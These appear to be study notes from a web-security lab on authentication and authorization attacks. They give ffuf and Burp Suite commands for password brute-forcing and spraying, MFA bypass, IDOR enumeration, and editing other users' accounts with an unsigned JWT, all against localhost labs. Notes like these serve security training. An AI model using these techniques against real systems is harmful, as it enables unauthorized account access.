# Authentication and Authorization Attacks

* Brute-force attacks:

  * In Burp Suite, we can capture the login request, send it to Intruder (Ctrl+I). Then, we can select the field to be fuzzed, add the payloads (using dictionary lists) and start attack.

  * Alternatively, we can save the intercepted login request to a file (Copy to file), replace the field to be edited by FUZZ, and use ```ffuf``` for brute-forcing:

    ```shell
    ffuf -request a0x01.txt -request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt
    # run this once and use Ctrl+C to break it

    # we can see that size for failed login is 1814, so we can filter that out

    ffuf -request a0x01.txt -request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt -fs 1814
    # gives password
    ```

* Attacking MFA:

  * We have been given a target account and a working set of credentials.

  * After logging in with working credentials, the generated MFA token seems to be weak and can be brute-forced.

  * Another edge-case here is we can modify the username when asked for MFA token to target username and forward the request.

* Authentication challenge:

  * We only have 5 login attempts for brute-force attacks; we can use password-spraying techniques in this case.

  * Using wordlists for common usernames along with 5 common passwords, we can attempt to brute-force our way.

    ```shell
    # intercept the login request for the page
    # and copy to file

    # in file, replace the value of username with FUZZ1 and value of password with FUZZ2
    # as we need to use two fuzzing locations here, clusterbomb mode

    # run the ffuf command once without -fs flag to check size to be filtered
    # then we can run actual command

    cat /usr/share/seclists/Passwords/xato-net-10-million-passwords-10.txt
    # we can refer top 5 passwords from here

    ffuf -request a0x03.txt -request-proto http -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZ1 -w 5-common-passwords.txt:FUZZ2 -fs 3256,3376
    ```

* IDOR (Insecure Direct Object Reference):

  * Capture the request to the page in Burp Suite - now we can use Repeater and modify the value of the query parameter (from URL) to get pages for different users.

  * If we want to get the page for certain type of users, we can use Intruder to add payloads from wordlist for the query value; from the results, we can filter by length.

  * Using ```ffuf```:

    ```shell
    ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w payloads.txt -mr 'admin'
    # -mr is used to filter by regex
    ```

* Broken access control:

  * We have 3 API requests given - ```POST /login.php``` to log into account, ```GET /account.php``` to get account details and ```PUT /account.php``` to update account details:

    ```shell
    curl -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "password123"}' http://localhost/labs/api/login.php
    # log into account
    # gives JWT value

    # here JWT is flawed as token does not include signature

    curl -X GET "http://localhost/labs/api/account.php?token=<JWT>"
    # use JWT from legit account

    curl -X PUT -H "Content-Type: application/json" -d '{token: "<JWT>", username:"username", bio: "New bio information."}' http://localhost/labs/api/account.php
    # update info for user
    # if we modify JWT value and username, we can change details for other user
    ```
